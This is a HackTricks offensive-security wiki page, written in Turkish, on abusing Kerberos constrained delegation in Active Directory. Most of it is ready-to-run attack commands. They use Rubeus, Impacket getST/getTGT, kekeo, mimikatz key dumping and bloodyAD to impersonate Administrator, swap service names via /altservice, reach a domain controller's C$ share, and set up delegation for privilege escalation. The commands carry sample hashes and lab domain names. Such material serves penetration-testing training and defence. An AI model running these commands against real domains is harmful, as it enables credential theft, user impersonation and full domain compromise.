# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Bunu kullanarak bir Domain admin, bir bilgisayarın bir user veya computer'ı herhangi bir machine üzerindeki herhangi bir service'e karşı impersonate etmesine **allow** edebilir.

- **Service for User to self (_S4U2self_):** Eğer bir **service account** _userAccountControl_ değeri [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) içeriyorsa, o zaman kendisi (the service) için herhangi bir başka user adına bir TGS elde edebilir.
- **Service for User to Proxy(_S4U2proxy_):** Bir **service account**, **msDS-AllowedToDelegateTo** içinde ayarlanmış servise herhangi bir user adına bir TGS elde edebilir. Bunu yapmak için önce o user'dan kendisine bir TGS alması gerekir, ancak önce S4U2self kullanarak o TGS'yi elde edebilir.

**Note**: Eğer bir user AD'de ‘_Account is sensitive and cannot be delegated_’ olarak işaretlenmişse, onları **impersonate** edemezsiniz.

Bu, eğer service'in hash'ini **compromise** ederseniz, user'ları **impersonate** edebileceğiniz ve onların adına belirtilen makineler üzerindeki herhangi bir service'e **access** elde edebileceğiniz (mümkün **privesc**) anlamına gelir.

Ayrıca, kullanıcıların impersonate edebildiği service'e erişiminiz olmasıyla sınırlı kalmayıp **herhangi bir service**e de erişiminiz olur çünkü SPN (istek yapılan service name) kontrol edilmiyor (ticket'ta bu kısım şifrelenmiş/imzalanmış değil). Bu nedenle, örneğin **CIFS service**e erişiminiz varsa `/altservice` flag'i ile Rubeus kullanarak **HOST service**e de erişebilirsiniz. Aynı SPN swapping zafiyeti **Impacket getST -altservice** ve diğer araçlar tarafından suistimal edilir.

Ayrıca, **LDAP service access on DC**, bir **DCSync**'i exploit etmek için gereken şeydir.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Cross-domain constrained delegation notes (2025+)

Windows Server 2012/2012 R2'den beri KDC, S4U2Proxy uzantıları aracılığıyla constrained delegation'ı domain/forest'ler arasında destekler. Modern sürümler (Windows Server 2016–2025) bu davranışı korur ve protokol geçişini belirtmek için iki PAC SID ekler:

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) kullanıcı normal şekilde kimlik doğruladığında.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) bir hizmet protokol geçişi yoluyla kimliği beyan ettiğinde.

Protokol geçişi alanlar arasında kullanıldığında, S4U2Proxy adımının başarılı olduğunu doğrulamak için PAC içinde `SERVICE_ASSERTED_IDENTITY` bekleyin.

### Impacket / Linux tooling (altservice & full S4U)

Güncel Impacket (0.11.x+) Rubeus ile aynı S4U zincirini ve SPN swapping'i ortaya çıkarır:
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'
```
Eğer kullanıcı ST'yi önce oluşturmayı tercih ediyorsanız (ör. yalnızca offline hash), S4U2Proxy için **ticketer.py** ile **getST.py**'yi eşleştirin. Güncel tuhaflıklar için açık Impacket issue #1713'e bakın (KRB_AP_ERR_MODIFIED, sahte ST SPN anahtarıyla eşleşmediğinde).

### Düşük ayrıcalıklı kimlik bilgileriyle delegasyon kurulumunu otomatikleştirme

Eğer zaten bir bilgisayar veya servis hesabı üzerinde **GenericAll/WriteDACL** hakkına sahipseniz, gerekli öznitelikleri RSAT kullanmadan uzaktan **bloodyAD** (2024+) ile itebilirsiniz:
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Bu, bu öznitelikleri yazabildiğiniz anda DA ayrıcalıkları olmadan privesc için constrained delegation yolunu oluşturmanıza olanak tanır.

- Adım 1: **İzin verilen hizmetin TGT'sini al**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Bilgisayarda SYSTEM olmadan **TGT ticket elde etmenin diğer yolları** veya **RC4** ya da **AES256** elde etmenin yolları vardır; örneğin Printer Bug, unconstrain delegation, NTLM relaying ve Active Directory Certificate Service abuse
>
> **Sadece o TGT ticket (or hashed) ile, tüm bilgisayarı ele geçirmeden bu attack'i gerçekleştirebilirsiniz.**

- Step2: **Get TGS — kullanıcıyı taklit ederek hizmet için**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**More information in ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) and [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

## Referanslar
- [Kerberos Constrained Delegation Overview (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Impacket issue #1713 – S4U2proxy forged service ticket errors](https://github.com/fortra/impacket/issues/1713)

{{#include ../../banners/hacktricks-training.md}}
